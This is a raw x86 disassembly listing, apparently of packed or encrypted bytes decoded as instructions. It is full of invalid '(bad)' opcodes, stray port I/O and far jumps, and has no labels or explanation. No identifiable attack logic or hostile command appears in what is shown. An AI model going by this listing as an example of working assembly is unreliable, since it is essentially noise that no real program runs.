  42a199:	imul   ebx,DWORD PTR [edi+edx*1],0x9c3d45d5
  42a1a0:	xchg   bh,ch
  42a1a2:	outs   dx,DWORD PTR ds:[esi]
  42a1a3:	inc    ebp
  42a1a4:	jecxz  0x42a195
  42a1a6:	div    DWORD PTR [ecx-0x5e]
  42a1a9:	xchg   esp,eax
  42a1aa:	xchg   bp,ax
  42a1ac:	or     BYTE PTR [ecx+0x2e],0x31
  42a1b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a1b1:	cmp    bh,bl
  42a1b3:	inc    ecx
  42a1b4:	call   0xb7e3:0x3c807e03
  42a1bb:	aam    0xeb
  42a1bd:	push   ecx
  42a1be:	ja     0x42a1a3
  42a1c0:	cmp    ah,BYTE PTR [edi+0x1e66275d]
  42a1c6:	sbb    eax,0x4fcff497
  42a1cb:	loop   0x42a171
  42a1cd:	fidivr WORD PTR [edx]
  42a1cf:	push   ds
  42a1d0:	adc    ah,ch
  42a1d2:	jno    0x42a1eb
  42a1d4:	out    dx,eax
  42a1d5:	ds sub DWORD PTR ds:[esi+0x3e],edx
  42a1da:	test   DWORD PTR [ebx-0x71ab61ba],ecx
  42a1e0:	aaa    
  42a1e1:	aam    0x1f
  42a1e3:	inc    ecx
  42a1e4:	or     eax,0xc32cfb42
  42a1e9:	mov    dh,0xfc
  42a1eb:	in     al,dx
  42a1ec:	lods   eax,DWORD PTR ds:[esi]
  42a1ed:	out    dx,eax
  42a1ee:	mov    cl,0x97
  42a1f0:	pushf  
  42a1f1:	inc    ecx
  42a1f2:	adc    eax,0x44a47c4e
  42a1f7:	ins    DWORD PTR es:[edi],dx
  42a1f8:	(bad)  
  42a1f9:	into   
  42a1fa:	cmp    esp,edi
  42a1fc:	adc    eax,0x4e5d2e8e
  42a201:	push   edi
  42a202:	inc    esi
  42a203:	and    BYTE PTR [ecx+eiz*2-0x4816d48c],0xf6
  42a20b:	rol    BYTE PTR [ebx+0x74a455],cl
	...
  42a271:	add    BYTE PTR [eax],al
  42a273:	add    BYTE PTR [ebx],ch
  42a275:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	fpatan 
  42a281:	or     BYTE PTR [edx],ch
  42a283:	or     dl,BYTE PTR [eax+0x40001c2]
  42a289:	add    DWORD PTR [eax],eax
  42a28b:	add    al,cl
  42a28d:	pusha  
  42a28e:	into   
  42a28f:	push   ss
  42a290:	inc    ebx
  42a291:	jg     0x42a2b1
  42a293:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a294:	adc    ebx,DWORD PTR [ecx]
  42a296:	popa   
  42a297:	or     eax,0x84b9579b
  42a29c:	sub    BYTE PTR [esi-0x69f4d0f3],0xef
  42a2a3:	dec    DWORD PTR [edi-0x5bfb2c86]
  42a2a9:	and    ebx,DWORD PTR [edi+0x1a]
  42a2ac:	xor    edi,DWORD PTR [edi+edx*4]
  42a2af:	std    
  42a2b0:	mov    bl,0x5c
  42a2b2:	mov    cl,0xf7
  42a2b4:	cmp    BYTE PTR [edi-0x52051fc4],bh
  42a2ba:	adc    DWORD PTR [edi],0x3b13b93d
  42a2c0:	into   
  42a2c1:	lahf   
  42a2c2:	dec    eax
  42a2c3:	dec    eax
  42a2c4:	xor    ebx,DWORD PTR [ecx-0x1f]
  42a2c7:	scas   eax,DWORD PTR es:[edi]
  42a2c8:	out    dx,eax
  42a2c9:	xchg   edi,eax
  42a2ca:	pop    edi
  42a2cb:	add    ecx,DWORD PTR [ebp+0x4cb17e72]
  42a2d1:	frstor [edx+0x2]
  42a2d4:	scas   al,BYTE PTR es:[edi]
  42a2d5:	dec    ebp
  42a2d6:	dec    eax
  42a2d7:	jo     0x42a2b2
  42a2d9:	out    dx,eax
  42a2da:	(bad)  
  42a2db:	push   ebp
  42a2dc:	adc    eax,DWORD PTR [edx-0x15c593fd]
  42a2e2:	mov    ds:0x106118e,eax
  42a2e7:	in     al,dx
  42a2e8:	mov    DWORD PTR ds:0xdb7f4ef5,0xc9ac22ed
  42a2f2:	fcomp  DWORD PTR [edx]
  42a2f4:	retf   
  42a2f5:	mov    fs,WORD PTR [edi+0x29]
  42a2f8:	in     eax,dx
  42a2f9:	mov    cl,0x59
  42a2fb:	fmulp  st(2),st
  42a2fd:	fcomp  QWORD PTR [esi]
  42a2ff:	cs jo  0x42a2bc
  42a302:	add    al,0x6b
  42a304:	cmp    al,0x6b
  42a306:	inc    esp
  42a307:	and    BYTE PTR [ebp+edi*4-0x6447d2e1],cl
  42a30e:	ror    BYTE PTR [ebx+0x6c],0x6c
  42a312:	cmc    
  42a313:	stos   DWORD PTR es:[edi],eax
  42a314:	mov    ah,0xba
  42a316:	dec    esi
  42a317:	leave  
  42a318:	adc    esi,DWORD PTR [ecx+eax*1+0x16]
  42a31c:	mov    eax,0x6efa7463
  42a321:	xchg   edi,eax
  42a322:	fistp  DWORD PTR [ecx]
  42a324:	sub    al,0xa2
  42a326:	mov    edi,0xe8be46ec
  42a32b:	popf   
  42a32c:	xchg   DWORD PTR [ecx],ecx
  42a32e:	je     0x42a342
  42a330:	(bad)
  42a335:	adc    edi,DWORD PTR [eax+0x47]
  42a338:	xchg   ebp,eax
  42a339:	mov    ecx,0xd862d06e
  42a33e:	push   eax
  42a33f:	and    ecx,0xffffffa2
  42a342:	mov    ah,0xf8
  42a344:	jnp    0x42a3c3
  42a346:	cdq    
  42a347:	xchg   ecx,eax
  42a348:	in     al,0x6a
  42a34a:	(bad)  
  42a34b:	test   al,0x3
  42a34d:	aam    0x11
  42a34f:	(bad)  
  42a350:	sbb    eax,0xbd2bbf21
  42a355:	and    al,0xa4
  42a357:	push   es
  42a358:	cmp    DWORD PTR [ebp-0x62],eax
  42a35b:	inc    edi
  42a35c:	sbb    ch,bl
  42a35e:	icebp  
  42a35f:	retf   
  42a360:	xor    DWORD PTR [edi-0x6a],ebx
  42a363:	adc    edx,DWORD PTR [ebx-0x56491d8e]
  42a369:	jmp    0x42a346
  42a36b:	adc    BYTE PTR [ecx-0x6937aa1a],0xb7
  42a372:	cmp    al,0x2d
  42a375:	sub    dl,BYTE PTR ss:[eax-0x24b4fcba]
  42a37c:	iret   
  42a37d:	stos   BYTE PTR es:[edi],al
  42a37e:	jecxz  0x42a3d8
  42a380:	add    esp,0xffffffb6
  42a383:	mov    bl,0xee
  42a385:	repz mov dh,BYTE PTR [edi]
  42a388:	outs   dx,BYTE PTR ds:[esi]
  42a389:	pop    esi
  42a38a:	inc    esp
  42a38b:	iret   
  42a38c:	mov    dl,BYTE PTR ds:0xcac
	...
  42a3f2:	add    BYTE PTR [eax],al
  42a3f4:	jg     0x42a404
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0x71c5a3d
  42a403:	retf   0xc394
  42a406:	add    DWORD PTR [eax],eax
  42a408:	add    al,0x1
  42a40a:	add    BYTE PTR [eax],al
  42a40c:	int3   
  42a40d:	gs pop edx
  42a40f:	inc    ebx
  42a410:	fsubr  DWORD PTR [ecx+0x57]
  42a413:	xor    al,0xd5
  42a415:	or     eax,0xc615c521
  42a41a:	mov    edi,0x52883215
  42a41f:	out    0x30,eax
  42a421:	das    
  42a422:	les    esp,FWORD PTR [ebx]
  42a424:	lock add DWORD PTR [ecx-0x58],ebx
  42a428:	jae    0x42a3de
  42a42a:	xchg   ecx,eax
  42a42b:	rol    eax,0xb3
  42a42e:	sub    DWORD PTR [ecx+ebx*1+0x20dc8d72],edi
  42a435:	jae    0x42a490
  42a437:	cs dec edx
  42a439:	jno    0x42a47a
  42a43b:	mov    esp,0x974a7dde
  42a440:	mov    cl,0xde
  42a442:	cmp    cl,bl
  42a444:	mov    bh,0xff
  42a446:	fadd   DWORD PTR [ebp-0x72aecbc5]
  42a44c:	sub    bh,BYTE PTR [ebx]
  42a44e:	pop    edx
  42a44f:	out    0xa,al
  42a451:	xchg   esi,eax
  42a452:	retf   
  42a453:	sbb    DWORD PTR [ebp-0x2442a694],edx
  42a459:	pop    ds
  42a45a:	or     BYTE PTR [ebx+0x3f],ch
  42a45d:	nop
  42a45e:	mov    bl,BYTE PTR [eax+0x3ef52b84]
  42a464:	xchg   ebx,eax
  42a465:	(bad)  
  42a467:	and    DWORD PTR [ecx+0x279a6d58],0xffffffff
  42a46e:	mov    edi,0xd7512570
  42a473:	into   
  42a474:	push   ebx
  42a475:	cmp    bl,BYTE PTR [ebp+0x23]
  42a478:	outs   dx,BYTE PTR ds:[esi]
  42a479:	cs aam 0x6a
  42a47c:	push   es
  42a47d:	adc    esp,eax
  42a47f:	pop    es
  42a480:	(bad)  
  42a481:	or     bh,BYTE PTR [edx]
  42a483:	shr    ebx,cl
  42a485:	pop    esp
  42a486:	arpl   WORD PTR [ebx],bx
  42a488:	sub    al,0x16
  42a48a:	and    eax,0xe73ccd49
  42a48f:	xor    DWORD PTR [eax-0x66],ebx
  42a492:	into   
  42a493:	fmul   DWORD PTR [ecx-0x6e7e3c08]
  42a499:	or     eax,0xfb8759f3
  42a49e:	cmc    
  42a49f:	ficom  DWORD PTR [ebx-0x75]
  42a4a2:	imul   ebx,DWORD PTR [esi+0x3baa02ec],0xc2ccb0bd
  42a4ac:	xchg   edi,eax
  42a4ad:	mov    ds:0xf0258a52,eax
  42a4b2:	push   0xbd5f5526
  42a4b7:	mov    DWORD PTR [edi],eax
  42a4b9:	mov    ch,0x9f
  42a4bb:	je     0x42a50f
  42a4bd:	mov    eax,0x47d4c4a
  42a4c2:	mov    dh,bl
  42a4c4:	mov    eax,0xa8cb4824
  42a4c9:	jle    0x42a537
  42a4cb:	push   esi
  42a4cc:	imul   ebp,DWORD PTR [edx+0xb2c93ed],0xfffffffb
  42a4d3:	out    dx,eax
  42a4d4:	inc    ebx
  42a4d5:	mov    ah,0x8c
  42a4d7:	push   ds
  42a4d8:	test   DWORD PTR fs:[eax+edx*1-0x34],edx
  42a4dd:	aam    0x1
  42a4df:	shl    DWORD PTR [ecx-0x610a6e09],cl
  42a4e5:	icebp  
  42a4e6:	es mov bl,0x66
  42a4e9:	(bad)  
  42a4eb:	ss js  0x42a522
  42a4ee:	lods   al,BYTE PTR ds:[esi]
  42a4ef:	pop    es
  42a4f0:	(bad)  
  42a4f1:	fdiv   DWORD PTR [edi-0xb]
  42a4f4:	inc    edi
  42a4f5:	add    edx,DWORD PTR [ebp-0x70]
  42a4f8:	mov    ch,0x25
  42a4fa:	es mov ebp,0xd05166c7
  42a500:	mov    eax,0x5c9bd29f
  42a505:	das    
  42a506:	push   0x48
  42a508:	dec    esi
  42a509:	jmp    0xa2c:0x3a82fafd
	...
  42a574:	sbb    BYTE PTR [edi+0x17],cl
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0xf14b239f
  42a583:	neg    BYTE PTR [eax+0x40001c4]
  42a589:	add    DWORD PTR [eax],eax
  42a58b:	add    BYTE PTR [esi+0x77],bl
  42a58e:	cmp    DWORD PTR [ecx+0x5fa82a9],eax
  42a594:	jecxz  0x42a5b7
  42a596:	sbb    dl,al
  42a598:	jg     0x42a5f5
  42a59a:	xchg   ebx,eax
  42a59b:	mov    ch,0x3a
  42a59d:	ja     0x42a59a
  42a59f:	jp     0x42a57f
  42a5a1:	dec    edx
  42a5a2:	mov    al,ds:0x8b056ba4
  42a5a7:	fild   WORD PTR [edx-0x2e9b7d06]
  42a5ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a5ae:	push   eax
  42a5af:	in     eax,0x7c
  42a5b1:	bound  ebp,QWORD PTR [eax+0xfafdff3]
  42a5b7:	pop    edx
  42a5b8:	mov    ah,0x26
  42a5ba:	push   edx
  42a5bb:	rcl    BYTE PTR [ecx-0x299a1a98],0x4c
  42a5c2:	xor    dh,BYTE PTR [ecx]
  42a5c4:	loope  0x42a572
  42a5c6:	push   edi
  42a5c7:	jmp    0x5ddd:0x59db94f0
  42a5ce:	dec    ebp
  42a5cf:	pop    ds
  42a5d0:	add    al,0x5b
  42a5d2:	iret   
  42a5d3:	or     dh,BYTE PTR [eax-0x1e271aea]
  42a5d9:	cmp    BYTE PTR [eax*4-0x4f420eda],al
  42a5e0:	pop    ebp
  42a5e1:	sub    esi,DWORD PTR [ecx+0x3952b3ba]
  42a5e7:	test   DWORD PTR [ebx+0x11],ecx
  42a5ea:	sbb    dl,BYTE PTR ds:0xb0faa51a
  42a5f0:	ffreep st(0)
  42a5f2:	cmp    eax,0x7f6d27fc
  42a5f7:	clc    
  42a5f8:	outs   dx,BYTE PTR ds:[esi]
  42a5f9:	or     al,0x5d
  42a5fb:	cmp    edx,esp
  42a5fd:	push   ebx
  42a5fe:	xlat   BYTE PTR ds:[ebx]
  42a5ff:	sub    esp,ebx
  42a601:	push   ds
  42a602:	add    BYTE PTR [esp+ecx*2],cl
  42a605:	sub    ebp,DWORD PTR [edi]
  42a607:	mov    ds:0xa66d3405,eax
  42a60c:	nop
  42a60d:	fdivr  DWORD PTR [ebp-0x2291d555]
  42a613:	in     al,dx
  42a614:	test   ah,bh
  42a616:	add    DWORD PTR [ebp+0x5f],edx
  42a619:	fiadd  WORD PTR [edx+0x7a52b072]
  42a61f:	cmp    edi,ecx
  42a621:	in     al,dx
  42a622:	fwait
  42a623:	mov    eax,ds:0x80ea9c74
  42a628:	scas   eax,DWORD PTR es:[edi]
  42a629:	lahf   
  42a62a:	inc    esi
  42a62b:	mov    ds:0xa09e4086,al
  42a630:	jecxz  0x42a654
  42a632:	lea    eax,[ebx]
  42a634:	and    eax,0x2372ee19
  42a639:	pop    ebp
  42a63a:	sub    DWORD PTR [ecx-0x44],ebp
  42a63d:	enter  0xe89e,0xbd
  42a641:	pop    eax
  42a642:	xchg   ebp,eax
  42a643:	aaa    
  42a644:	cmp    esp,esp
  42a646:	out    dx,eax
  42a647:	add    ebx,DWORD PTR [ecx]
  42a649:	push   ss
  42a64a:	add    al,0x6d
  42a64c:	push   ecx
  42a64d:	jb     0x42a5f3
  42a64f:	push   0x35c2fcd8
  42a654:	push   cs
  42a655:	push   ebx
  42a656:	clc    
  42a657:	xor    edi,edx
  42a659:	adc    edi,edx
  42a65b:	lea    eax,[edx+0x24493ba4]
  42a661:	into   
  42a662:	hlt    
  42a663:	mov    eax,0x5d83d2b4
  42a668:	push   esi
  42a669:	jb     0x42a6a6
  42a66b:	jle    0x42a611
  42a66d:	imul   eax,DWORD PTR [ecx+0x4800ada3],0x56
  42a674:	dec    edi
  42a675:	call   FWORD PTR [eax]
  42a677:	sbb    DWORD PTR [edi+0x26c03ca2],edx
  42a67d:	xor    al,0xae
  42a67f:	xor    BYTE PTR [edi],ah
  42a681:	jl     0x42a681
  42a683:	xchg   ebp,eax
  42a684:	(bad)  
  42a686:	out    0xbb,eax
  42a688:	push   es
  42a689:	mov    ds:0xf5cacad4,al
  42a68e:	adc    DWORD PTR [ecx+0x0],ebx
	...
  42a6f4:	and    al,0x16
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi-0x7a47ece4],0x9c6e7903
  42a705:	lds    eax,FWORD PTR [ecx]
  42a707:	add    BYTE PTR [ecx+eax*1],al
  42a70a:	add    BYTE PTR [eax],al
  42a70c:	jl     0x42a691
  42a70e:	push   0xffffffff
  42a710:	xchg   edx,eax
  42a711:	push   ebx
  42a712:	fs imul esi,edi,0xc7eda4c7
  42a719:	bound  ebp,QWORD PTR [ebp+0x7b]
  42a71c:	cmp    ch,BYTE PTR [ecx-0x483d527f]
  42a722:	mov    esp,0x806ab68c
  42a727:	inc    eax
  42a728:	stos   DWORD PTR es:[edi],eax
  42a729:	mov    ss,WORD PTR [ebx-0x71ec0f4d]
  42a72f:	shl    BYTE PTR ds:0xbaadd275,0xc5
  42a736:	imul   eax,ebp,0xe266f556
  42a73c:	sbb    al,0xe5
  42a73e:	aad    0x8a
  42a740:	ret    
  42a741:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a742:	jmp    0xc4cb3a56
  42a747:	sub    edi,DWORD PTR [esi]
  42a749:	data16 in al,dx
  42a74b:	repz rol cl,1
  42a74e:	pop    ds
  42a74f:	mov    edx,0x56962d1b
  42a754:	inc    esp
  42a755:	(bad)  
  42a756:	ja     0x42a718
  42a758:	xor    al,0xf7
  42a75a:	add    BYTE PTR [edx],ch
  42a75c:	xlat   BYTE PTR ds:[ebx]
  42a75d:	xchg   esi,eax
  42a75e:	sub    al,0xc
  42a760:	cli    
  42a761:	mov    ds:0xed06b6ff,eax
  42a766:	cmp    bh,bh
  42a768:	push   ss
  42a769:	loopne 0x42a75a
  42a76b:	and    eax,0x909229c3
  42a770:	xor    esi,DWORD PTR [eax+esi*2-0x59980112]
  42a777:	mov    eax,0xeb1acc9e
  42a77c:	cmp    eax,ecx
  42a77e:	mov    eax,ds:0x6b0e8cf3
  42a783:	sbb    al,0x6b
  42a785:	aam    0x65
  42a787:	push   eax
  42a788:	inc    ebp
  42a789:	cmc    
  42a78a:	xor    ebx,ecx
  42a78c:	stc    
  42a78d:	into   
  42a78e:	and    BYTE PTR [ecx+eiz*8],cl
  42a791:	mov    ebx,0xadd5169
  42a796:	mov    al,ds:0xc92c32d0
  42a79b:	sub    dh,ch
  42a79d:	aas    
  42a79e:	je     0x42a785
  42a7a0:	sbb    eax,0x4f700c3b
  42a7a5:	(bad)  
  42a7a7:	sbb    eax,0x435b9486
  42a7ac:	call   0x8e28e52c
  42a7b1:	sbb    BYTE PTR [esi+0xe],cl
  42a7b4:	xor    edx,DWORD PTR [ecx]
  42a7b6:	cwde   
  42a7b7:	dec    edi
  42a7b8:	fs ret 0x1862
  42a7bc:	(bad)  
  42a7be:	add    cl,BYTE PTR [edi]
  42a7c0:	pop    ebx
  42a7c1:	es jg  0x42a76c
  42a7c4:	cwd    
  42a7c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a7c7:	lea    ecx,[eax+0x17]
  42a7ca:	int3   
  42a7cb:	cs retf 
  42a7cd:	call   0x3b57a609
  42a7d2:	(bad)  
  42a7d3:	aad    0x6a
  42a7d5:	push   edi
  42a7d6:	dec    ebx
  42a7d7:	sub    DWORD PTR [eax+0x33e30a4e],edi
  42a7dd:	and    al,0x70
  42a7df:	in     eax,dx
  42a7e0:	xor    eax,0xfa1fa9cf
  42a7e5:	loope  0x42a849
  42a7e7:	movaps XMMWORD PTR [ebx+edx*2+0x693a6670],xmm6
  42a7ef:	sbb    dl,BYTE PTR [eax-0x2dd0465c]
  42a7f5:	sbb    ebx,DWORD PTR [edx]
  42a7f7:	aad    0x64
  42a7f9:	(bad)  
  42a7fa:	dec    ebp
  42a7fb:	push   ds
  42a7fc:	push   edx
  42a7fd:	call   0x8b931d50
  42a802:	jmp    0xfe4d:0x9c6fd158
  42a809:	retf   
  42a80a:	jmp    0xf2:0xf5cfc515
	...
  42a871:	add    BYTE PTR [eax],al
  42a873:	add    BYTE PTR [edx-0x10409c9b],cl
  42a879:	mov    edi,0xc58175de
  42a87e:	xchg   edi,eax
  42a87f:	ins    BYTE PTR es:[edi],dx
  42a880:	pop    esi
  42a881:	int    0x6e
  42a883:	jae    0x42a825
  42a885:	mov    BYTE PTR [ecx],0x0
  42a888:	add    al,0x1
  42a88a:	add    BYTE PTR [eax],al
  42a88c:	stc    
  42a88d:	ss cdq 
  42a88f:	ins    DWORD PTR es:[edi],dx
  42a890:	ss int 0x2f
  42a893:	inc    ecx
  42a894:	adc    BYTE PTR [ebx+0x2a02378e],cl
  42a89a:	inc    esp
  42a89b:	mov    bl,0x18
  42a89d:	sub    BYTE PTR [esp+edi*8+0x6452cda3],ch
  42a8a4:	mov    eax,0xf25fa8e6
  42a8a9:	fidivr WORD PTR [edi]
  42a8ab:	(bad)
  42a8ae:	fdiv   st(4),st
  42a8b0:	gs inc edi
  42a8b2:	jle    0x42a8a6
  42a8b4:	cmp    ah,BYTE PTR [edx+0x6e]
  42a8b7:	mov    cl,0x43
  42a8b9:	sar    BYTE PTR [esi],1
  42a8bb:	loopne 0x42a8db
  42a8bd:	push   ss
  42a8be:	mov    WORD PTR [edi+0x4],cs
  42a8c1:	inc    ebx
  42a8c2:	inc    ebp
  42a8c3:	push   eax
  42a8c4:	or     BYTE PTR [esp+ebp*2],dl
  42a8c7:	or     al,0xaf
  42a8c9:	add    eax,0x34ac8eb8
  42a8ce:	inc    eax
  42a8cf:	xor    DWORD PTR [ecx+0x1],ebp
  42a8d2:	push   0xffffffcc
  42a8d4:	add    ebx,edx
  42a8d6:	lds    ebp,FWORD PTR [eax+0x6b210283]
  42a8dc:	pop    ss
  42a8dd:	cmp    cl,al
  42a8df:	outs   dx,BYTE PTR ds:[esi]
  42a8e0:	add    dl,BYTE PTR [ebp-0x1f078a69]
  42a8e6:	scas   al,BYTE PTR es:[edi]
  42a8e7:	push   ecx
  42a8e8:	and    eax,0x19ad52b6
  42a8ed:	or     BYTE PTR [ebp-0x69],0xdc
  42a8f1:	mov    esp,0x2eff0f5f
  42a8f6:	out    dx,al
  42a8f7:	xor    al,0xab
  42a8f9:	adc    ah,BYTE PTR [edx+0x1f]
  42a8fc:	sbb    ebx,DWORD PTR [ebx+0x3e8b262]
  42a902:	jnp    0x42a982
  42a904:	in     eax,dx
  42a905:	addr16 xchg esi,eax
  42a907:	xchg   esp,eax
  42a908:	ret    0x55de
  42a90b:	xor    BYTE PTR [esi+0x69],bh
  42a90e:	adc    BYTE PTR [esi-0x3d],ah
  42a911:	fsubp  st(0),st
  42a913:	push   edx
  42a914:	xor    ah,ch
  42a916:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a917:	pushf  
  42a918:	xor    DWORD PTR [edx+0x6511790f],0x5a
  42a91f:	cwde   
  42a920:	mov    ds,WORD PTR [ebx*2+0x6b9dd7bc]
  42a927:	es loop 0x42a992
  42a92a:	push   edi
  42a92b:	or     BYTE PTR [ebx+ecx*8],ch
  42a92e:	jl     0x42a98b
  42a930:	mov    ah,0x1e
  42a932:	imul   BYTE PTR [ecx]
  42a934:	xor    cl,BYTE PTR [edx]
  42a936:	mov    bl,0xcf
  42a938:	push   ebp
  42a939:	and    dh,BYTE PTR [edi]
  42a93b:	(bad)  
  42a93c:	or     al,0xc4
  42a93e:	mov    edx,0x1f6a7cc5
  42a943:	dec    eax
  42a944:	cmp    al,al
  42a946:	ins    BYTE PTR es:[edi],dx
  42a947:	clc    
  42a948:	(bad)  
  42a949:	adc    eax,0x4b7b9946
  42a94e:	(bad)  
  42a94f:	out    0x75,al
  42a951:	inc    ebx
  42a952:	xor    DWORD PTR ds:0x70be3533,esp
  42a958:	dec    ebp
  42a959:	retf   0xf940
  42a95c:	jg     0x42a971
  42a95e:	sbb    esp,DWORD PTR [edx]
  42a960:	retf   0xf4c1
  42a963:	dec    edx
  42a964:	and    DWORD PTR [esi-0x56b349d9],ebx
  42a96a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a96b:	jg     0x42a9af
  42a96d:	pop    ecx
  42a96e:	jg     0x42a904
  42a970:	push   0x23cca30b
  42a975:	pop    esp
  42a976:	aaa    
  42a977:	ss push 0xffffffb1
  42a97a:	cmp    DWORD PTR [edx+ebx*8-0x37],edi
  42a97e:	pusha  
  42a97f:	fldenv [ecx-0x6b]
  42a982:	std    
  42a983:	add    ah,BYTE PTR [ecx+0x8]
  42a986:	ja     0x42a9ea
  42a988:	lahf   
  42a989:	jecxz  0x42aa04
  42a98b:	int    0x5c
  42a98d:	outs   dx,DWORD PTR ds:[esi]
  42a98e:	xchg   esp,eax
  42a98f:	dec    ebx
	...
  42a9f4:	test   al,0x93
  42a9f6:	sbb    eax,0xfbee3fee
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	pop    ss
  42aa01:	cld    
  42aa02:	clc    
  42aa03:	jp     0x42a9a9
  42aa05:	mov    DWORD PTR [ecx],0x10400
  42aa0b:	add    BYTE PTR [edi],bh
  42aa0d:	mov    es,esi
  42aa0f:	(bad)  
  42aa10:	pop    esp
  42aa11:	or     eax,0xde9a0a5e
  42aa16:	nop
  42aa17:	retf   0xefec
  42aa1a:	repnz retf 0xa4b5
  42aa1e:	imul   ecx,DWORD PTR [esi+0x9],0x69a3933a
  42aa25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aa26:	jns    0x42aa74
  42aa28:	inc    eax
  42aa29:	inc    ecx
  42aa2a:	into   
  42aa2b:	ret    0x663b
  42aa2e:	dec    ebx
  42aa2f:	or     eax,0x579b152
  42aa34:	icebp  
  42aa35:	in     eax,0x76
  42aa37:	jb     0x42aa49
  42aa39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aa3a:	jl     0x42aa37
  42aa3c:	mov    eax,0x1b619789
  42aa41:	scas   al,BYTE PTR es:[edi]
  42aa42:	mov    esi,0xe2b3a4e7
  42aa47:	pop    ss
  42aa48:	xchg   BYTE PTR [ebx-0x29f1eed3],ah
  42aa4e:	sub    ah,dl
  42aa50:	add    edx,edx
  42aa52:	push   esp
  42aa53:	pop    eax
  42aa54:	push   ds
  42aa55:	daa    
  42aa56:	dec    ebp
  42aa57:	adc    al,0x3f
  42aa59:	sub    eax,0xdf2edd57
  42aa5e:	(bad)  
  42aa60:	out    0xe1,al
  42aa62:	dec    ebx
  42aa63:	loopne 0x42aa54
  42aa65:	xor    dh,BYTE PTR [edi]
  42aa67:	test   ebx,ebx
  42aa69:	test   eax,0x95ce8569
  42aa6e:	jne    0x42aad4
  42aa70:	cdq    
  42aa71:	shl    BYTE PTR fs:[edx],0x75
  42aa75:	out    dx,eax
  42aa76:	jmp    0x476e:0xe55f7199
  42aa7d:	push   ss
  42aa7e:	mov    ecx,0xc1495859
  42aa83:	fcomp  st(0)
  42aa85:	jbe    0x42aab7
  42aa87:	push   ecx
  42aa88:	jo     0x42aaa6
  42aa8a:	das    
  42aa8b:	jmp    0x43455473
  42aa90:	dec    ecx
  42aa91:	xchg   esp,eax
  42aa92:	mov    al,0x94
  42aa94:	dec    edx
  42aa95:	cwde   
  42aa96:	sti    
  42aa97:	sub    DWORD PTR es:[edi+0x342f9157],ecx
  42aa9e:	imul   ebx,DWORD PTR [ebp+ebp*4+0x63],0x3ea120a3
  42aaa6:	int3   
  42aaa7:	xchg   edx,eax
  42aaa8:	sbb    dh,BYTE PTR [eax+ebx*4-0x4e]
  42aaac:	fisttp DWORD PTR [ebx-0x7e]
  42aaaf:	and    DWORD PTR [ebp+0x61],eax
  42aab2:	mov    edi,0x45ec8181
  42aab7:	hlt    
  42aab8:	pop    edx
  42aab9:	outs   dx,DWORD PTR ds:[esi]
  42aaba:	push   edi
  42aabb:	ds daa 
  42aabd:	or     eax,0xda93ed52
  42aac2:	xchg   ebp,eax
  42aac3:	add    ah,bl
  42aac5:	mov    ds:0x8aa8e644,eax
  42aaca:	mov    al,ds:0xfe90cbfb
  42aacf:	ror    BYTE PTR [edi+0x4ceba852],1
  42aad5:	or     al,0x5d
  42aad7:	push   ss
  42aad8:	sbb    esp,DWORD PTR [esi+0x30]
  42aadb:	or     eax,DWORD PTR [edx-0x4b73e85]
  42aae1:	inc    ecx
  42aae2:	data16 mov dl,0x89
  42aae5:	jne    0x42aaf4
  42aae7:	add    al,0xb0
  42aae9:	mov    bh,0xb6
  42aaeb:	jmp    0x42ab4e
  42aaed:	mul    BYTE PTR [edx+0x7138fe7a]
  42aaf3:	and    eax,0x4f9e034e
  42aaf8:	mov    ?,WORD PTR [edx]
  42aafa:	js     0x42ab45
  42aafc:	jmp    0x44c0:0x7b2c9309
  42ab03:	mov    esp,0xf0b4bada
  42ab08:	das    
  42ab09:	aad    0xcc
  42ab0b:	dec    ebx
  42ab0c:	data16 jge 0x42ab72
  42ab0f:	sbb    BYTE PTR [eax],al
	...
  42ab71:	add    BYTE PTR [eax],al
  42ab73:	add    BYTE PTR [esi],bh
  42ab75:	push   cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	fisttp WORD PTR [esi-0x3757509c]
  42ab86:	add    DWORD PTR [eax],eax
  42ab88:	add    al,0x1
  42ab8a:	add    BYTE PTR [eax],al
  42ab8c:	mov    BYTE PTR [eax-0x697b6068],al
  42ab92:	sbb    BYTE PTR [edx+0x11],bl
  42ab95:	ror    DWORD PTR [eax-0x5b6a0d9e],0x95
  42ab9c:	fadd   QWORD PTR [eax+ecx*8]
  42ab9f:	shl    BYTE PTR [ebp+0x27aa5a6],0xcb
  42aba6:	xlat   BYTE PTR ds:[ebx]
  42aba7:	imul   edi,DWORD PTR [eax+0x54],0x83a4690b
  42abae:	(bad)  
  42abaf:	repnz dec edx
  42abb1:	mov    al,0x7e
  42abb3:	xchg   edi,eax
  42abb4:	inc    ebx
  42abb5:	sub    al,0x28
  42abb7:	in     al,0x6c
  42abb9:	cld    
  42abba:	cmp    BYTE PTR [ebp+0x27],0x1f
  42abbe:	push   es
  42abbf:	jmp    0x2ca29c28
  42abc4:	jecxz  0x42ac3a
  42abc6:	inc    DWORD PTR [ecx-0x7e]
  42abc9:	xor    eax,edi
  42abcb:	xor    eax,0x8aebf27e
  42abd0:	jp     0x42abf5
  42abd2:	adc    BYTE PTR [eax-0x52],cl
